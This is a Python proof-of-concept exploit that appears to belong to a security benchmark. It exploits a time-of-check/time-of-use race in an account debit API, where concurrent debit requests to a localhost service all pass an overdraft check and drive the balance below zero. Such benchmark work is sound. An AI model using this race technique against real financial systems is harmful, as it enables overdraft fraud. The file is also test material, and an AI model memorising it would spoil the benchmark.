"""PoC exploit: TOCTOU race condition in async account debit (CWE-362).

After the 3-stage chain:
- Stage 1 implements account CRUD handlers with balance tracking and synchronous debit
- Stage 2 adds overdraft guard: reject debits when balance < amount
- Stage 3 moves debit processing to background goroutine for faster response

The vulnerability: the overdraft check reads account.Balance in the main
goroutine, but Balance is only decremented after the background goroutine
completes the slow debit work (~1 second). During that window, concurrent
debit requests all see the original balance, all pass the overdraft check,
and each spawns its own goroutine.

Result: N concurrent debit requests for the same account can each deduct
the full amount, driving the balance far below zero (overdraft).

The attack is straightforward:
1. Create an account with balance 10000 (100.00)
2. Send 5 concurrent POST /api/v1/accounts/:id/debit with amount=5000 each
3. Wait for background goroutines to complete
4. Check GET /api/v1/accounts/:id -- balance < 0 or debit_count > 2 confirms the race
   (only 2 debits of 5000 should be allowed from a 10000 balance)
"""

import threading
import time
import uuid

from benchmark.chains.poc_templates import ReplayRaceTemplate


class AsyncBalanceRaceExploit(ReplayRaceTemplate):
    """TOCTOU race condition in async account debit -- overdraft via race."""

    def __init__(self, base_url: str = "http://localhost:39180"):
        super().__init__(base_url)
        self._account_id: int = 0

    @property
    def chain_id(self) -> str:
        return "swag_async_race_accounts"

    def setup(self) -> None:
        """Create a test account with known balance."""
        unique_name = f"race_debit_{uuid.uuid4().hex[:12]}"
        resp = self.http_post(
            "/api/v1/accounts",
            json={"name": unique_name},
            headers={"Content-Type": "application/json"},
        )
        if not resp.ok:
            raise ConnectionError(
                f"Failed to create test account: {resp.status_code} {resp.text[:200]}"
            )
        data = resp.json()
        self._account_id = data.get("id", 0)
        if not self._account_id:
            raise ConnectionError(f"No account ID in response: {data}")

    def execute(self) -> tuple[bool, str]:
        """Send concurrent debits and check for overdraft."""
        if not self._account_id:
            return False, "Setup failed: no account ID"

        # Verify initial balance
        check_resp = self.http_get(f"/api/v1/accounts/{self._account_id}")
        if not check_resp.ok:
            return False, f"Could not read account {self._account_id}: {check_resp.status_code}"

        initial = check_resp.json()
        initial_balance = initial.get("balance", 0)

        if initial_balance <= 0:
            return False, f"Account has no balance to debit: balance={initial_balance}"

        # Each debit requests more than half the balance, so at most 2 should succeed
        debit_amount = (initial_balance // 2) + 1
        num_concurrent = 5

        def send_debit(idx: int):
            """Send a single debit POST in a thread."""
            return self.http_post(
                f"/api/v1/accounts/{self._account_id}/debit",
                json={"amount": debit_amount},
                headers={"Content-Type": "application/json"},
            )

        results, errors = self.concurrent(num_concurrent, send_debit)

        if errors:
            return False, f"HTTP errors during concurrent requests: {errors}"

        # Count successful debits (200 responses) vs rejected (400 insufficient)
        success_count = sum(1 for r in results if r and r.status_code == 200)
        rejected_count = sum(1 for r in results if r and r.status_code == 400)

        # Wait for background goroutines to complete debit processing
        time.sleep(3)

        # Check the final account state
        final_resp = self.http_get(f"/api/v1/accounts/{self._account_id}")
        if not final_resp.ok:
            return False, (
                f"GET /api/v1/accounts/{self._account_id} returned "
                f"{final_resp.status_code}. "
                f"Debit responses: {success_count}/{num_concurrent} accepted, "
                f"{rejected_count} rejected."
            )

        final = final_resp.json()
        final_balance = final.get("balance", 0)
        debit_count = final.get("debit_count", 0)

        evidence_parts = [
            f"Initial balance: {initial_balance} cents.",
            f"Debit amount per request: {debit_amount} cents.",
            f"Sent {num_concurrent} concurrent debits.",
            f"Debit responses: {success_count} accepted, {rejected_count} rejected.",
            f"Final balance: {final_balance} cents, debit_count: {debit_count}.",
        ]

        # The race is confirmed if:
        # 1. Balance went negative (overdraft), OR
        # 2. More debits were accepted than the balance could support
        max_legit_debits = initial_balance // debit_amount  # should be 1
        if final_balance < 0:
            return True, (
                f"TOCTOU race confirmed (CWE-362). "
                f"Overdraft detected: final balance={final_balance} (negative). "
                f"The overdraft guard checks balance in the main goroutine, "
                f"but balance is only decremented after the background goroutine "
                f"completes. Concurrent debits all see the original balance "
                f"({initial_balance}), all pass the overdraft check, and each "
                f"spawns a goroutine that decrements the balance. "
                + " ".join(evidence_parts)
            )

        if debit_count > max_legit_debits + 1:
            return True, (
                f"TOCTOU race confirmed (CWE-362). "
                f"Excess debits detected: debit_count={debit_count} "
                f"(expected at most {max_legit_debits + 1}). "
                f"Multiple goroutines processed debits concurrently. "
                + " ".join(evidence_parts)
            )

        if success_count > max_legit_debits + 1:
            return True, (
                f"TOCTOU race confirmed (CWE-362). "
                f"Too many debits accepted: {success_count} accepted "
                f"(expected at most {max_legit_debits + 1} from balance "
                f"{initial_balance} with debit {debit_amount}). "
                + " ".join(evidence_parts)
            )

        return False, (
            f"No overdraft detected. "
            f"Final balance={final_balance}, debit_count={debit_count}. "
            f"The overdraft guard may be working correctly "
            f"(checking before background dispatch). "
            + " ".join(evidence_parts)
        )
